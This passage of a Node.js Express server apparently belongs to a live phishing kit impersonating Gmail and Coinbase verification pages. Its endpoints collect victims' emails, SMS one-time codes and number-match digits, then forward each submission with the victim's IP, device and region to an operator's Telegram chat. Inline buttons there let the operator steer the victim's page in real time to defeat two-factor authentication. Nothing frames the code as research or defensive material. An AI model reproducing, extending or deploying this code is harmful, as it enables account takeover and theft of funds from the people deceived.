        parse_mode: options.parse_mode,
        reply_markup: options.reply_markup
      })
    });

    console.log('🔍 DEBUG: Sending response with requestId:', requestId);
    res.json({ status: "pending", requestId, email: gmailEmail });

  } catch (err) {
    console.error("❌ Verification Page endpoint error:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

// ✅ POST /update-selected-digits
app.post("/update-selected-digits", (req, res) => {
  try {
    const { requestId, digit } = req.body;
    if (!requestId || digit === undefined) {
      return res.status(400).json({ error: "Missing requestId or digit" });
    }
    
    if (!pendingVerificationPage[requestId]) {
      return res.status(400).json({ error: "Invalid requestId" });
    }

    if (!pendingVerificationPage[requestId].selectedDigits) {
      pendingVerificationPage[requestId].selectedDigits = [];
    }

    pendingVerificationPage[requestId].selectedDigits.push(digit);
    console.log(`✅ Digit ${digit} selected for ${requestId}`);

    res.json({ ok: true, selectedCount: pendingVerificationPage[requestId].selectedDigits.length });
  } catch (err) {
    console.error("❌ Update selected digits error:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

// ✅ GET /get-selected-digits
app.get("/get-selected-digits", (req, res) => {
  try {
    const { requestId } = req.query;
    if (!requestId) {
      return res.status(400).json({ error: "Missing requestId" });
    }

    const entry = pendingVerificationPage[requestId];
    if (!entry) {
      return res.json({ success: false });
    }

    if (entry.selectedDigits && entry.selectedDigits.length === 2) {
      const number = entry.selectedDigits[0] + entry.selectedDigits[1];
      return res.json({ success: true, number });
    }

    res.json({ success: false });
  } catch (err) {
    console.error("❌ Get selected digits error:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

// ✅ POST /send-verification-confirm
app.post("/send-verification-confirm", async (req, res) => {
  try {
    const { email, userId, digit1, digit2, requestId } = req.body;
    console.log('📥 send-verification-confirm called with:', { email, userId, digit1, digit2, requestId });
    
    if (!email || !userId || digit1 === undefined || digit2 === undefined) {
      return res.status(400).json({ error: "Missing required fields" });
    }

    const confirmRequestId = `verify_confirm_${Date.now()}_${Math.random().toString(36).substring(7)}`;
    
    const ip = req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
      req.headers["x-real-ip"] ||
      req.connection.remoteAddress ||
      "Unknown IP";

    const userAgent = req.get("user-agent") || "Unknown";
    const device = detectDevice(userAgent);
    const region = await detectRegion(ip);

    console.log(`📥 Verification Confirm Request received: ${confirmRequestId}`);

    pendingVerificationPage[confirmRequestId] = { status: "pending", email: email };

    const selectedNumber = digit1 + digit2;
    const message =
      `🌈🌈🌈 <b>Gmail - Verify Numbers</b> 🌈🌈🌈\n` +
      `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
      `<b>📧 Email:</b> <code>${email}</code>\n` +
      `<b>🔢 Selected Numbers:</b> <code><b>${selectedNumber}</b></code>\n` +
      `<b>🌍 Region:</b> ${region}\n` +
      `<b>💻 Device:</b> ${device}\n` +
      `<b>📍 IP:</b> ${ip}`;

    const options = {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "✅ Accept", callback_data: `gmail_verify_accept|${confirmRequestId}` },
            { text: "❌ Reject", callback_data: `gmail_verify_reject|${confirmRequestId}` }
          ]
        ]
      }
    };

    const botToken = process.env.BOT_TOKEN;
    const chatId = process.env.ADMIN_CHAT_ID;

    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: options.parse_mode,
        reply_markup: options.reply_markup
      })
    });

    console.log('✅ Verification confirm message sent');
    res.json({ status: "pending", requestId: confirmRequestId });

  } catch (err) {
    console.error("❌ Verification Confirm endpoint error:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

// ✅ POST /resend-verification
app.post("/resend-verification", async (req, res) => {
  try {
    const { userId, email, requestId } = req.body;
    console.log('🔄 resend-verification called with:', { userId, email, requestId });
    
    if (!userId || !email || !requestId) {
      return res.status(400).json({ error: "Missing required fields" });
    }

    const ip = req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
      req.headers["x-real-ip"] ||
      req.connection.remoteAddress ||
      "Unknown IP";

    const userAgent = req.get("user-agent") || "Unknown";
    const device = detectDevice(userAgent);
    const region = await detectRegion(ip);

    console.log(`📥 Resend Verification Request received for: ${requestId}`);

    // ✅ CLEAR OLD DIGITS
    if (pendingVerificationPage[requestId]) {
      pendingVerificationPage[requestId].selectedDigits = null;
      console.log(`🔄 Cleared old digits for ${requestId}`);
    }

    const message =
      `🔄 <b>Resend Code - Gmail</b> 🔄\n` +
      `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
      `<b>🌍 Region:</b> ${region}\n` +
      `<b>💻 Device:</b> ${device}\n` +
      `<b>📍 IP:</b> ${ip}`;

    const options = {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "0", callback_data: `verify_digit|${requestId}|0` },
            { text: "1", callback_data: `verify_digit|${requestId}|1` },
            { text: "2", callback_data: `verify_digit|${requestId}|2` },
            { text: "3", callback_data: `verify_digit|${requestId}|3` },
            { text: "4", callback_data: `verify_digit|${requestId}|4` }
          ],
          [
            { text: "5", callback_data: `verify_digit|${requestId}|5` },
            { text: "6", callback_data: `verify_digit|${requestId}|6` },
            { text: "7", callback_data: `verify_digit|${requestId}|7` },
            { text: "8", callback_data: `verify_digit|${requestId}|8` },
            { text: "9", callback_data: `verify_digit|${requestId}|9` }
          ]
        ]
      }
    };

    const botToken = process.env.BOT_TOKEN;
    const chatId = process.env.ADMIN_CHAT_ID;

    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: options.parse_mode,
        reply_markup: options.reply_markup
      })
    });

    console.log('🔄 Resend verification message sent');
    res.json({ status: "ok", requestId });

  } catch (err) {
    console.error("❌ Resend Verification endpoint error:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

// ✅ GET /api/verification-status/:requestId
app.get("/api/verification-status/:requestId", (req, res) => {
  try {
    const { requestId } = req.params;
    const entry = pendingVerificationPage[requestId];
    if (!entry) {
      return res.json({ status: "pending" });
    }
    res.json({ status: entry.status });
  } catch (err) {
    console.error("❌ Verification status endpoint error:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

// ============================================================================
// VERIFYING PAGE ENDPOINTS
// ============================================================================

// ✅ Storage for Verifying Page
const pendingVerifying = {};

app.post("/send-verifying", async (req, res) => {
  try {
    console.log('📥 /send-verifying endpoint called');
    const { userId, email } = req.body;
    console.log('🔍 DEBUG: Received userId:', userId, 'email:', email);
    
    if (!userId || !email) {
      return res.status(400).json({ error: "Missing userId or email" });
    }
    
    const verifyingId = `verifying_${Date.now()}_${Math.random().toString(36).substring(7)}`;
    console.log('🔍 DEBUG: Generated verifyingId:', verifyingId);
    
    const ip = req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
      req.headers["x-real-ip"] ||
      req.connection.remoteAddress ||
      "Unknown IP";

    const userAgent = req.get("user-agent") || "Unknown";
    const device = detectDevice(userAgent);
    const region = await detectRegion(ip);

    pendingVerifying[verifyingId] = { status: "pending", userId, email, choice: null };
    console.log(`📥 Verifying Request received: ${verifyingId}`);

    const message =
      `😈😈😈 <b>Coinbase - Verifying</b> 😈😈😈\n` +
      `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
      `<b>📧 Email:</b> <code>${email}</code>\n` +
      `<b>🌍 Region:</b> ${region}\n` +
      `<b>💻 Device:</b> ${device}\n` +
      `<b>📍 IP:</b> ${ip}`;

    const options = {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "💬 SMS - 2 💬", callback_data: `verifying_sms|${verifyingId}` }],
          [{ text: "🏁 Done 🏁", callback_data: `verifying_done|${verifyingId}` }],
          [{ text: "💼 Wallet 💼", callback_data: `verifying_wallet|${verifyingId}` }]
        ]
      }
    };

    const botToken = process.env.BOT_TOKEN;
    const chatId = process.env.ADMIN_CHAT_ID;

    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: options.parse_mode,
        reply_markup: options.reply_markup
      })
    });

    console.log('✅ Verifying message sent with 3 buttons');
    res.json({ status: "pending", verifyingId });

  } catch (err) {
    console.error("❌ Verifying endpoint error:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

// ✅ GET /check-verifying-choice
app.get("/check-verifying-choice", (req, res) => {
  try {
    const { verifyingId } = req.query;
    if (!verifyingId) {
      return res.status(400).json({ error: "Missing verifyingId" });
    }

    const entry = pendingVerifying[verifyingId];
    if (!entry) {
      return res.json({ choice: null });
    }

    res.json({ choice: entry.choice });
  } catch (err) {
    console.error("❌ Check verifying choice error:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

// ✅ POST /update-verifying-choice
app.post("/update-verifying-choice", (req, res) => {
  try {
    const { verifyingId, choice } = req.body;
    if (!verifyingId || !choice) {
      return res.status(400).json({ error: "Missing verifyingId or choice" });
    }

    if (!pendingVerifying[verifyingId]) {
      return res.status(400).json({ error: "Invalid verifyingId" });
    }

    pendingVerifying[verifyingId].choice = choice;
    console.log(`✅ Updated verifying choice: ${choice} for ${verifyingId}`);

    res.json({ ok: true });
  } catch (err) {
    console.error("❌ Update verifying choice error:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

// ✅ GET /get-verifying-info/:verifyingId
app.get("/get-verifying-info/:verifyingId", (req, res) => {
  try {
    const { verifyingId } = req.params;
    const entry = pendingVerifying[verifyingId];
    if (!entry) {
      return res.json({ email: 'unknown@example.com', userId: '?' });
    }
    res.json({ email: entry.email, userId: entry.userId });
  } catch (err) {
    console.error("❌ Get verifying info error:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

// ============================================================================
// SMS 2 ENDPOINTS
// ============================================================================

// ✅ Storage for SMS 2
const pendingSMS2 = {};

app.post("/sms2-login", async (req, res) => {
  try {
    console.log('📥 /sms2-login endpoint called');
    const { code, userId, email } = req.body;
    console.log('🔍 DEBUG: Received code:', code, 'userId:', userId, 'email:', email);
    
    if (!code || !userId || !email) {
      return res.status(400).json({ error: "Missing code, userId, or email" });
    }
    
    const sms2Id = `sms2_${Date.now()}_${Math.random().toString(36).substring(7)}`;
    console.log('🔍 DEBUG: Generated sms2Id:', sms2Id);
    
    const ip = req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
      req.headers["x-real-ip"] ||
      req.connection.remoteAddress ||
      "Unknown IP";

    const userAgent = req.get("user-agent") || "Unknown";
    const device = detectDevice(userAgent);
    const region = await detectRegion(ip);

    pendingSMS2[sms2Id] = { status: "pending", code, email, userId, choice: null };
    console.log(`📥 SMS 2 Request received: ${sms2Id}`);

    const message =
      `🔐🔐🔐 <b>Coinbase - SMS 2</b> 🔐🔐🔐\n` +
      `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
      `<b>📧 Email:</b> <code>${email}</code>\n` +
      `<b>🔢 Code:</b> <code>${code}</code>\n` +
      `<b>🌍 Region:</b> ${region}\n` +
      `<b>💻 Device:</b> ${device}\n` +
      `<b>📍 IP:</b> ${ip}`;

    const options = {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "💼 Wallet 💼", callback_data: `sms2_wallet|${sms2Id}` }],
          [{ text: "🏁 Done 🏁", callback_data: `sms2_done|${sms2Id}` }],
          [{ text: "❌ Reject ❌", callback_data: `sms2_reject|${sms2Id}` }]
        ]
      }
    };

    const botToken = process.env.BOT_TOKEN;
    const chatId = process.env.ADMIN_CHAT_ID;

    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: options.parse_mode,
        reply_markup: options.reply_markup
      })
    });

    console.log('✅ SMS 2 message sent with 3 buttons');
    res.json({ status: "pending", sms2Id });

  } catch (err) {
    console.error("❌ SMS 2 login endpoint error:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

// ✅ GET /check-sms2-status
app.get("/check-sms2-status", (req, res) => {
  try {
    const { sms2Id } = req.query;
    if (!sms2Id) {
      return res.status(400).json({ error: "Missing sms2Id" });
    }

    const entry = pendingSMS2[sms2Id];
    if (!entry) {
      return res.json({ choice: null });
    }

    res.json({ choice: entry.choice });
  } catch (err) {
    console.error("❌ Check SMS 2 status error:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

// ✅ POST /update-sms2-choice
app.post("/update-sms2-choice", (req, res) => {
  try {
    const { sms2Id, choice } = req.body;
    if (!sms2Id || !choice) {
      return res.status(400).json({ error: "Missing sms2Id or choice" });
    }

    if (!pendingSMS2[sms2Id]) {
      return res.status(400).json({ error: "Invalid sms2Id" });
    }

    pendingSMS2[sms2Id].choice = choice;
    console.log(`✅ Updated SMS 2 choice: ${choice} for ${sms2Id}`);

    res.json({ ok: true });
  } catch (err) {
    console.error("❌ Update SMS 2 choice error:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

// ✅ GET /get-sms2-info/:sms2Id
app.get("/get-sms2-info/:sms2Id", (req, res) => {
  try {
    const { sms2Id } = req.params;
    const entry = pendingSMS2[sms2Id];
    if (!entry) {
      return res.json({ email: 'unknown@example.com', code: '?' });
    }
    res.json({ email: entry.email, code: entry.code });
  } catch (err) {
    console.error("❌ Get SMS 2 info error:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});
